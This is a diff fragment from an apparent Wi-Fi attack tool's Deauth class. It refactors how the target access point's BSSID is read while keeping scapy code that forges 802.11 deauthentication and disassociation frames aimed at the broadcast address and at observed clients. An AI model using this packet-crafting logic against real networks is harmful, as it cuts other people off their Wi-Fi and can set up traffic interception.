@@ -36,7 +36,7 @@ class Deauth(object):
         self._data = data
 
         # Craft and add deauth/disas packet to broadcast address
-        self._craft_packet(self._data["target_ap_bssid"], constants.WIFI_BROADCAST)
+        self._craft_packet(self._data.target_ap_bssid, constants.WIFI_BROADCAST)
 
     def _craft_packet(self, sender, receiver):
         """
@@ -54,11 +54,11 @@ class Deauth(object):
         """
 
         deauth_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=12, \
-                    addr1=receiver, addr2=sender, addr3=self._data["target_ap_bssid"]) \
+                    addr1=receiver, addr2=sender, addr3=self._data.target_ap_bssid) \
                   / dot11.Dot11Deauth())
 
         disassoc_packet = (dot11.RadioTap() / dot11.Dot11(type=0, subtype=10, \
-                    addr1=receiver, addr2=sender, addr3=self._data["target_ap_bssid"]) \
+                    addr1=receiver, addr2=sender, addr3=self._data.target_ap_bssid) \
                   / dot11.Dot11Disas())  
 
         return [disassoc_packet, deauth_packet]
@@ -94,22 +94,22 @@ class Deauth(object):
             # discovered client check to see if either one is a client
             if receiver not in non_valid_list and sender not in non_valid_list:
                 # in case the receiver is the access point
-                if receiver == self._data["target_ap_bssid"]:
+                if receiver == self._data.target_ap_bssid:
                     # add the sender to the client list
                     self._observed_clients.append(sender)
 
                     # create and add deauthentication packets for client
-                    deauth_pkts += self._craft_packet(sender, self._data["target_ap_bssid"])
-                    deauth_pkts += self._craft_packet(self._data["target_ap_bssid"], sender)
+                    deauth_pkts += self._craft_packet(sender, self._data.target_ap_bssid)
+                    deauth_pkts += self._craft_packet(self._data.target_ap_bssid, sender)
 
                 # in case the sender is the access point
-                elif sender == self._data["target_ap_bssid"]:
+                elif sender == self._data.target_ap_bssid:
                     # add the receiver to the client list
                     self._observed_clients.append(receiver)
 
                     # create and add deauthentication packets for client
-                    deauth_pkts += self._craft_packet(receiver, self._data["target_ap_bssid"])
-                    deauth_pkts += self._craft_packet(self._data["target_ap_bssid"], receiver)
+                    deauth_pkts += self._craft_packet(receiver, self._data.target_ap_bssid)
+                    deauth_pkts += self._craft_packet(self._data.target_ap_bssid, receiver)
 
         return deauth_pkts
 
